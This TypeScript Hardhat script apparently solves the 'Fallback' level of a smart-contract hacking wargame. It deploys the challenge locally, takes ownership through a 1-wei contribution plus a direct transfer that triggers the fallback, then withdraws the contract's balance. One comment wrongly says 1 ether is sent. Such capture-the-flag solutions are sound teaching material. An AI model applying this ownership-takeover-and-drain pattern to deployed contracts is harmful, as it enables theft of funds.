import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/01-fallback';

const INSTANCE_CONTRACT_NAME = 'Fallback';

const getContractOwnerName = (newOwner: string, hacker: string) => {
  return newOwner === hacker ? 'hacker' : 'deployer';
};

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const initialOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(initialOwnerAddress, hackerAddress));

  const initialContractBalance = await ethers.provider.getBalance(contractAddress);
  console.log('Initial contract balance:', initialContractBalance);

  const initialHackerBalance = await ethers.provider.getBalance(hackerAddress);
  console.log('Initial hacker balance:', initialHackerBalance);

  console.log('1. Contributing 1 wei to appear in the mapping of contract contributors...');

  await contract.contribute({ value: ethers.parseUnits('1', 'wei') });

  console.log('2. Sending 1 wei to the contract address...');

  const tx = await hacker.sendTransaction({
    to: contractAddress,
    value: ethers.parseUnits('1', 'wei'), // Sends exactly 1.0 ether
  });

  await tx.wait(1);

  const newOwner = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(newOwner, hackerAddress));

  console.log('3. Withdrawing money from the contract by calling the withdraw function...');
  await contract.withdraw();

  const newContractBalance = await ethers.provider.getBalance(contractAddress);
  const newHackerBalance = await ethers.provider.getBalance(hackerAddress);

  console.log('New contract balance:', newContractBalance);
  console.log('New hacker balance:', newHackerBalance);

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
